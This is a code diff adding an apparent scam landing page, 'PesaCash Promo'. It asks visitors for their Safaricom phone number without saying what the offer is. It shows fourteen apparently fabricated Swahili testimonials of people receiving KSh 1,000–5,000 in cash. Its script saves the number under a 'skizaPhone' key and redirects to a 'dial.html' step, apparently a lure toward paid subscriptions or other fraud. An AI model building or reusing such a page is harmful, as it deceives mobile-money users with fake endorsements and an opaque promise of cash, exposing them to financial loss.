@@ -6,10 +6,194 @@
 
   <title>PesaCash Promo</title>
 
-  
+  <link rel="stylesheet" href="style.css">
+</head>
+
+<body>
+
+  <div class="container">
+
+    <!-- HEADER -->
+    <div class="header">
+
+      <div class="logo">
+        PesaCash Promo
+      </div>
+
+      <div class="subtitle">
+        Complete the steps to get started
+      </div>
+
+    </div>
 
 
-  
+    <!-- MAIN CARD -->
+    <div class="card">
+
+      <div class="offer">
+
+        <h1>Get Started Today</h1>
+
+        <p>
+          Enter your Safaricom number below to begin.
+        </p>
+
+      </div>
+
+
+      <!-- STEPS -->
+      <div class="steps">
+
+        <div class="step">
+          <div class="step-number">1</div>
+          Enter Number
+        </div>
+
+        <div class="step">
+          <div class="step-number">2</div>
+          Continue
+        </div>
+
+        <div class="step">
+          <div class="step-number">3</div>
+          Complete Process
+        </div>
+
+      </div>
+
+
+      <!-- PHONE NUMBER -->
+      <div class="form-title">
+        📱 Enter your Safaricom number
+      </div>
+
+      <input
+        id="phone"
+        class="phone-input"
+        type="tel"
+        inputmode="numeric"
+        maxlength="10"
+        placeholder="07XXXXXXXX"
+        autocomplete="tel"
+      >
+
+
+      <!-- BUTTON -->
+      <button
+        type="button"
+        class="continue-btn"
+        onclick="continueProcess()"
+      >
+        CONTINUE
+      </button>
+
+
+      <div class="notice">
+        Enter your Safaricom number to continue.
+      </div>
+
+    </div>
+
+
+    <!-- COMMENTS -->
+    <div class="comments">
+
+      <h2>Recent Messages</h2>
+
+      <div class="comment-list">
+
+        <div class="comment">
+          Sarah: Nimepata KSh 3,000, asante sana
+        </div>
+
+        <div class="comment">
+          Kevin: Nimepata KSh 1,000, nimefurahi sana
+        </div>
+
+        <div class="comment">
+          Mary: Nimefanikiwa kupata KSh 2,500 leo
+        </div>
+
+        <div class="comment">
+          Brian: Asante, nimepata KSh 5,000
+        </div>
+
+        <div class="comment">
+          Jane: Nimepokea yangu, hatua zilikuwa rahisi
+        </div>
+
+        <div class="comment">
+          Peter: Nimefurahia fursa hii sana
+        </div>
+
+        <div class="comment">
+          Lucy: Nimepata KSh 4,000, asante sana
+        </div>
+
+        <div class="comment">
+          David: Nimefanikiwa kupata KSh 2,000 leo
+        </div>
+
+        <div class="comment">
+          Ann: Nimepata KSh 5,000, nimefurahi sana
+        </div>
+
+        <div class="comment">
+          Michael: Nimepokea KSh 1,500, asante
+        </div>
+
+        <div class="comment">
+          Grace: Nimepata nafasi yangu leo
+        </div>
+
+        <div class="comment">
+          John: Nimefanikiwa kupata KSh 3,500
+        </div>
+
+        <div class="comment">
+          Esther: Nimepata KSh 2,000, asante sana
+        </div>
+
+        <div class="comment">
+          Samuel: Nimepokea yangu bila shida
+        </div>
+
+      </div>
+
+    </div>
+
+  </div>
+
+
+  <!-- JAVASCRIPT -->
+  <script>
+
+    function continueProcess() {
+
+      const phone = document
+        .getElementById("phone")
+        .value
+        .trim();
+
+      if (!/^07\d{8}$/.test(phone)) {
+
+        alert(
+          "Tafadhali ingiza nambari sahihi ya Safaricom, mfano 0712345678."
+        );
+
+        return;
+      }
+
+      localStorage.setItem(
+        "skizaPhone",
+        phone
+      );
+
+      window.location.href = "dial.html";
+
+    }
+
+  </script>
 
 </body>
 </html>
